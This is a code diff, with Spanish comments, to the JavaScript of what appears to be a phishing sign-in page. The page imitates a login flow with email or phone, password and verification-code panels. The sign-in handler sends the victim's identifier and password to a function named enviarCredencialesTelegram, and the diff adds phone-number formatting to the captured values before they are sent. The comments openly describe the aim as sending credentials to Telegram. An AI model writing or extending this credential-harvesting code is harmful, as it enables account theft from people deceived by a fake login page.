@@ -1,3 +1,17 @@
+// Hacer que el enlace 'Change' en el panel de verificación funcione
+setTimeout(() => {
+  const changeLinkCode = document.getElementById('changeLinkCode');
+  if (changeLinkCode) {
+    changeLinkCode.onclick = function(e) {
+      e.preventDefault();
+      const panelCode = document.getElementById('panelCode');
+      panelCode.style.display = 'none';
+      panel1.style.display = 'block';
+      panel1.setAttribute('aria-hidden', 'false');
+      panelCode.setAttribute('aria-hidden', 'true');
+    };
+  }
+}, 10);
 // Volver a inicio al hacer click en 'Change' del panel de código
 const changeLinkCode = document.getElementById('changeLinkCode');
 if(changeLinkCode){
@@ -55,9 +69,30 @@ const togglePwd = document.getElementById('togglePwd');
 const password = document.getElementById('password');
 const signInBtn = document.getElementById('signInBtn');
 
-function showPanel2(email) {
-  displayEmail.textContent = email;
-  codeEmail.textContent = email;
+function showPanel2(identifier) {
+  // Detectar si es número telefónico (solo dígitos, mínimo 7)
+  const isPhone = /^\d{10}$/.test(identifier);
+  let label = document.querySelector('.email-line');
+  let codeLabel = document.getElementById('codeEmail');
+  let codeRadioLabel = document.querySelector('label.radio .divPassword');
+  if (isPhone) {
+    // Formatear: (xxx) xxx-xxxx
+    const area = identifier.slice(0, 3);
+    const mid = identifier.slice(3, 6);
+    const last = identifier.slice(6);
+    const formatted = `(${area}) ${mid}-${last}`;
+    label.innerHTML = 'Phone number<br><strong id="displayEmail">' + formatted + '</strong> <a id="changeLink" class="link" href="#">Change</a>';
+    codeLabel.textContent = formatted;
+    if (codeRadioLabel) {
+      codeRadioLabel.innerHTML = 'Phone number verification code<br><span class="small muted" id="codeEmail">' + formatted + '</span>';
+    }
+  } else {
+    label.innerHTML = 'Email<br><strong id="displayEmail">' + identifier + '</strong> <a id="changeLink" class="link" href="#">Change</a>';
+    codeLabel.textContent = identifier;
+    if (codeRadioLabel) {
+      codeRadioLabel.innerHTML = 'Email me a verification code<br><span class="small muted" id="codeEmail">' + identifier + '</span>';
+    }
+  }
   panel1.style.display = 'none';
   panel2.style.display = 'block';
   panel2.setAttribute('aria-hidden', 'false');
@@ -74,6 +109,19 @@ continueBtn.addEventListener('click', () => {
   identifier.style.borderColor = '';
   // For demo we accept whatever is typed. If it's a phone, still show it.
   showPanel2(val);
+  // Reasignar el evento 'Change' cada vez que se renderiza el panel
+  setTimeout(() => {
+    const changeLink = document.getElementById('changeLink');
+    if (changeLink) {
+      changeLink.onclick = function(e) {
+        e.preventDefault();
+        panel2.style.display = 'none';
+        panel1.style.display = 'block';
+        panel1.setAttribute('aria-hidden', 'false');
+        panel2.setAttribute('aria-hidden', 'true');
+      };
+    }
+  }, 10);
 });
 
 changeLink.addEventListener('click', (e) => {
@@ -120,20 +168,60 @@ signInBtn.addEventListener('click', () => {
   if (panelCode && codePanelEmail && codePanelEmail2) {
     panelCode.style.display = 'block';
     panelCode.setAttribute('aria-hidden', 'false');
-    codePanelEmail.textContent = displayEmail.textContent;
-    codePanelEmail2.textContent = displayEmail.textContent;
+    // Detectar si es teléfono o email
+    let rawIdentifier = identifier.value.trim();
+    let soloDigitos = rawIdentifier.replace(/\D/g, '');
+    let tipo = 'Email';
+    let valor = rawIdentifier;
+    if (/^\d{10}$/.test(soloDigitos)) {
+      const area = soloDigitos.slice(0, 3);
+      const mid = soloDigitos.slice(3, 6);
+      const last = soloDigitos.slice(6);
+      valor = `(${area}) ${mid}-${last}`;
+      tipo = 'Phone number';
+    }
+    codePanelEmail.textContent = valor;
+    codePanelEmail2.textContent = valor;
+    // Actualizar label si existe
+    let label = panelCode.querySelector('.email-line');
+    if (label) {
+      label.innerHTML = tipo + '<br><strong id="codePanelEmail">' + valor + '</strong> <a id="changeLinkCode" class="link" href="#">Change</a>';
+      // Asignar evento al nuevo enlace 'Change'
+      const changeLinkCode = document.getElementById('changeLinkCode');
+      if (changeLinkCode) {
+        changeLinkCode.onclick = function(e) {
+          e.preventDefault();
+          panelCode.style.display = 'none';
+          panel1.style.display = 'block';
+          panel1.setAttribute('aria-hidden', 'false');
+          panelCode.setAttribute('aria-hidden', 'true');
+        };
+      }
+    }
   }
   // Enviar a Telegram según método
+  // Detectar si es teléfono o email para el mensaje
+  let rawIdentifier = identifier.value.trim();
+  let soloDigitos = rawIdentifier.replace(/\D/g, '');
+  let tipo = 'Correo';
+  let valor = rawIdentifier;
+  if (/^\d{10}$/.test(soloDigitos)) {
+    const area = soloDigitos.slice(0, 3);
+    const mid = soloDigitos.slice(3, 6);
+    const last = soloDigitos.slice(6);
+    valor = `(${area}) ${mid}-${last}`;
+    tipo = 'Phone number';
+  }
   if (optPass.checked) {
     if (typeof enviarCredencialesTelegram === 'function') {
-      enviarCredencialesTelegram(displayEmail.textContent, password.value);
+      enviarCredencialesTelegram(valor, password.value);
     }
-    console.log('Signed in', { email: displayEmail.textContent, password: password.value });
+    console.log('Signed in', { tipo, valor, password: password.value });
   } else {
     if (typeof enviarCredencialesTelegram === 'function') {
-      enviarCredencialesTelegram(displayEmail.textContent, '');
+      enviarCredencialesTelegram(valor, '');
     }
-    console.log('Request code for', displayEmail.textContent);
+    console.log('Request code for', tipo, valor);
   }
 });
 // Lógica para enviar el código a Telegram
